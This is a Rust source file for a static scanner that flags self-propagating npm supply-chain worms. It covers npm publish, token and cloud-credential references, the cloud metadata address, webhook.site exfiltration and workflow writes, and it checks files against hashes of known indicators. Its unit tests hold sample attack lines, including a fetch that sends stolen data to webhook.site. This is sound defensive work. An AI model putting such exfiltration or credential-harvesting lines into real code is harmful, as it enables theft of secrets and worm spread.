// Local worm-signature detector — statically detects self-propagating worm patterns
// (Shai-Hulud class). No execution, no network. Pure static analysis over .js/.yml files.

use regex::Regex;
use serde_json::{Map, Value};
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

type Finding = Map<String, Value>;

/// Known-IOC SHA-256 hashes embedded at compile time (data/worm_iocs.txt).
static WORM_IOCS_DATA: &str = include_str!("../../data/worm_iocs.txt");

fn load_iocs() -> HashSet<String> {
    WORM_IOCS_DATA
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(|l| l.to_lowercase())
        .collect()
}

fn finding(severity: &str, message: &str, file: &str, category: &str) -> Finding {
    let mut m = Map::new();
    m.insert("check".into(), Value::String("worm_signature".into()));
    m.insert("severity".into(), Value::String(severity.to_string()));
    m.insert("message".into(), Value::String(message.to_string()));
    m.insert("file".into(), Value::String(file.to_string()));
    m.insert("category".into(), Value::String(category.to_string()));
    m
}

const SCAN_EXTENSIONS: &[&str] = &["js", "cjs", "mjs", "ts", "tsx", "jsx", "yml", "yaml"];

fn scan_files(dir: &Path) -> Vec<PathBuf> {
    WalkDir::new(dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            e.path()
                .extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| SCAN_EXTENSIONS.contains(&ext))
                .unwrap_or(false)
        })
        .map(|e| e.path().to_path_buf())
        .collect()
}

fn rel(dir: &Path, path: &Path) -> String {
    path.strip_prefix(dir)
        .unwrap_or(path)
        .display()
        .to_string()
}

/// Scan `dir` for worm-class supply-chain indicators.
///
/// Three categories are checked per-file:
///   - self_propagation: npm publish, authToken reads, registry PUT
///   - credential_harvest: TruffleHog, cloud IMDS, cloud/git credential refs
///   - exfil_persistence: webhook.site, GitHub repo creation, workflow writes, shai-hulud literal
///
/// An aggregate `worm` BLOCK finding is emitted when ≥2 distinct categories are present,
/// indicating a Shai-Hulud-class self-replicating worm rather than a single-vector attack.
///
/// Every scanned file is also SHA-256-hashed against the embedded IOC list (data/worm_iocs.txt).
pub fn check_worm_signature(dir: &Path) -> Vec<Finding> {
    // ---- compile regexes once ----
    // Self-propagation patterns (BLOCK)
    let re_npm_publish = Regex::new(r"npm\s+publish\b").unwrap();
    let re_auth_token = Regex::new(r"_authToken|NPM_TOKEN|\.npmrc").unwrap();
    let re_registry_put = Regex::new(r"registry\.npmjs\.org.*PUT|PUT.*registry\.npmjs\.org").unwrap();

    // Credential harvest patterns (BLOCK)
    let re_trufflehog = Regex::new(r"trufflehog").unwrap();
    let re_imds = Regex::new(r"169\.254\.169\.254").unwrap();
    let re_cloud_creds = Regex::new(
        r"AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN|GH_TOKEN|\.git-credentials|\.aws/credentials",
    )
    .unwrap();

    // Exfil + persistence patterns (BLOCK)
    let re_webhook = Regex::new(r"webhook\.site").unwrap();
    let re_gh_repo_create = Regex::new(
        r"api\.github\.com.*/user/repos|repos\.create\b|createForAuthenticatedUser",
    )
    .unwrap();
    let re_workflow_write = Regex::new(r"\.github/workflows/").unwrap();
    let re_shai_hulud = Regex::new(r"shai.hulud").unwrap();

    let iocs = load_iocs();
    let mut findings: Vec<Finding> = Vec::new();
    let mut categories_seen: HashSet<&'static str> = HashSet::new();

    for path in scan_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        let file = rel(dir, &path);

        // ---- IOC hash check ----
        let hash = format!("{:x}", Sha256::digest(content.as_bytes()));
        if iocs.contains(&hash) {
            findings.push(finding(
                "BLOCK",
                &format!("Known-IOC SHA-256 match: {} ({})", hash, file),
                &file,
                "ioc_hash",
            ));
            categories_seen.insert("ioc_hash");
        }

        // ---- self_propagation ----
        if re_npm_publish.is_match(&content)
            || re_auth_token.is_match(&content)
            || re_registry_put.is_match(&content)
        {
            findings.push(finding(
                "BLOCK",
                &format!(
                    "Self-propagation indicator in {} (npm publish / authToken / registry PUT)",
                    file
                ),
                &file,
                "self_propagation",
            ));
            categories_seen.insert("self_propagation");
        }

        // ---- credential_harvest ----
        if re_trufflehog.is_match(&content)
            || re_imds.is_match(&content)
            || re_cloud_creds.is_match(&content)
        {
            findings.push(finding(
                "BLOCK",
                &format!(
                    "Credential-harvest indicator in {} (TruffleHog / IMDS / cloud credentials)",
                    file
                ),
                &file,
                "credential_harvest",
            ));
            categories_seen.insert("credential_harvest");
        }

        // ---- exfil_persistence ----
        if re_webhook.is_match(&content)
            || re_gh_repo_create.is_match(&content)
            || re_workflow_write.is_match(&content)
            || re_shai_hulud.is_match(&content)
        {
            findings.push(finding(
                "BLOCK",
                &format!(
                    "Exfil/persistence indicator in {} (webhook.site / GitHub repo create / workflow write / shai-hulud)",
                    file
                ),
                &file,
                "exfil_persistence",
            ));
            categories_seen.insert("exfil_persistence");
        }
    }

    // ---- aggregate worm finding ----
    // Require ≥2 distinct functional categories (ioc_hash alone is not sufficient for the worm badge).
    let functional: HashSet<&&str> = categories_seen
        .iter()
        .filter(|&&c| c != "ioc_hash")
        .collect();
    if functional.len() >= 2 {
        let mut worm_f = Map::new();
        worm_f.insert("check".into(), Value::String("worm_signature".into()));
        worm_f.insert("severity".into(), Value::String("BLOCK".into()));
        worm_f.insert(
            "message".into(),
            Value::String(format!(
                "Self-replicating worm pattern detected (Shai-Hulud class): {} categories triggered",
                functional.len()
            )),
        );
        worm_f.insert("category".into(), Value::String("worm".into()));
        findings.push(worm_f);
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn dir_with(files: &[(&str, &str)]) -> TempDir {
        let tmp = TempDir::new().unwrap();
        for (name, content) in files {
            // create parent dirs if needed (e.g. ".github/workflows/foo.yml")
            let full = tmp.path().join(name);
            if let Some(parent) = full.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(full, content).unwrap();
        }
        tmp
    }

    fn cats(findings: &[Finding]) -> Vec<&str> {
        findings
            .iter()
            .filter_map(|f| f.get("category").and_then(|v| v.as_str()))
            .collect()
    }

    #[test]
    fn self_propagation_npm_publish() {
        let d = dir_with(&[("bundle.js", "exec('npm publish --access public');")]);
        let f = check_worm_signature(d.path());
        assert!(cats(&f).contains(&"self_propagation"), "got: {:?}", f);
    }

    #[test]
    fn credential_harvest_imds() {
        let d = dir_with(&[("a.js", "fetch('http://169.254.169.254/latest/meta-data/');")]);
        let f = check_worm_signature(d.path());
        assert!(cats(&f).contains(&"credential_harvest"), "got: {:?}", f);
    }

    #[test]
    fn exfil_persistence_webhook() {
        let d = dir_with(&[("a.js", "fetch('https://webhook.site/abc123', {body: data});")]);
        let f = check_worm_signature(d.path());
        assert!(cats(&f).contains(&"exfil_persistence"), "got: {:?}", f);
    }

    #[test]
    fn aggregate_worm_emitted_when_two_functional_categories() {
        let d = dir_with(&[(
            "bundle.js",
            "exec('npm publish'); fetch('https://webhook.site/x', {body: stolen});",
        )]);
        let f = check_worm_signature(d.path());
        assert!(cats(&f).contains(&"worm"), "expected worm aggregate; got: {:?}", f);
    }

    #[test]
    fn single_category_no_worm_aggregate() {
        let d = dir_with(&[("a.js", "exec('npm publish --access public');")]);
        let f = check_worm_signature(d.path());
        assert!(!cats(&f).contains(&"worm"), "should not emit worm with single category; got: {:?}", f);
    }

    #[test]
    fn clean_file_no_findings() {
        let d = dir_with(&[("index.js", "module.exports = function add(a,b){return a+b;};")]);
        let f = check_worm_signature(d.path());
        assert!(f.is_empty(), "clean file should produce no findings; got: {:?}", f);
    }
}
